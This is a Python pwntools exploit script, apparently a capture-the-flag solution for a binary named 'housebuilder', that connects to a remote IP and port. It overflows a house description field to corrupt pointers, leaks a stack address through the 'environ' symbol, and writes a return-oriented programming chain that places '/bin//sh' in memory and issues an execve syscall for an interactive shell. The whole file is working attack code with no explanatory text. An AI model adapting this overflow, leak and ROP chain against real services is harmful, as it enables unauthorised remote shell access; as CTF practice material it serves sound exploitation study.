from pwn import *


#p = process("./housebuilder")
p = remote("151.236.114.211", 17174)
#0x405bcd
#libc  >=  2.31

elf = ELF("./housebuilder")


def createHouse(name,rooms,floor,people):
	p.sendlineafter(">","1")
	p.sendlineafter("name",name)
	p.sendlineafter("rooms",rooms)
	p.sendlineafter("floors",floor)
	p.sendlineafter("peoples",people)


def enterHouse(idx):
	p.sendlineafter(">","2")
	p.sendlineafter("idx",idx)

def listHouse():
	p.sendlineafter(">","3")
	p.recvuntil("++++++++++")
	return p.recvuntil("5. Exit")

def deleteHouse(idx):
	p.sendlineafter(">","4")
	p.sendlineafter("idx",idx)

def viewHouseInfo():
	p.sendlineafter(">","1")

def changeDescription(des):
	p.sendlineafter(">","2")		
	p.sendlineafter("description",des)

def sellHouse():
	p.sendlineafter(">","3")


createHouse("namnp1","1","1","1")
createHouse("namnp2","2","2","2") 
createHouse("namnp3","2","2","2")
createHouse("namnp4","2","2","2")

environ = elf.sym['environ']
houseList = elf.sym['HousesList']

enterHouse("0")

payload = b'A'*0x420
payload += p64(0x0)
payload += p64(environ)
payload += p64(0x8)
payload += p64(2)
#payload += p64(houseList + 0x20)
changeDescription(payload)

p.sendlineafter(">","4") #exit

stack = u64(listHouse().split(b"House #")[2].split(b"Name: ")[1][:8])
print(hex(stack))
#print(len(data))

enterHouse("0")

payload = b'A'*0x420
payload += p64(0x0)
payload += p64(environ)
payload += p64(0x8)
payload += p64(2)
payload += p64(0)
payload += p64(stack-0x180)
changeDescription(payload)

p.sendlineafter(">","4") #exit
enterHouse("1")



payload = p64(0x0000000000407668) # pop rsi ; ret
payload += p64(0x00000000005d4000) # @ .data
payload += p64(0x000000000041fcba) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x0000000000418965) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000407668) # pop rsi ; ret
payload += p64(0x00000000005d4008) # @ .data + 8
payload += p64(0x0000000000513499) # xor rax, rax ; ret
payload += p64(0x0000000000418965) # mov qword ptr [rsi], rax ; ret
payload += p64(0x000000000041432a) #pop rdi ; pop rbp ; ret
payload += p64(0x00000000005d4000) # @ .data
payload += p64(environ)
payload += p64(0x0000000000407668) # pop rsi ; ret
payload += p64(0x00000000005d4008) # @ .data + 8
payload += p64(0x00000000004044cf) # pop rdx ; ret
payload += p64(0x00000000005d4008) # @ .data + 8
payload += p64(0x000000000041fcba) # pop rax,ret
payload += p64(59)
payload += p64(0x0000000000403c73) # syscall

#gdb.attach(p,"b* 0x405c86")

changeDescription(payload)
p.sendlineafter(">","4") #exit



p.interactive()

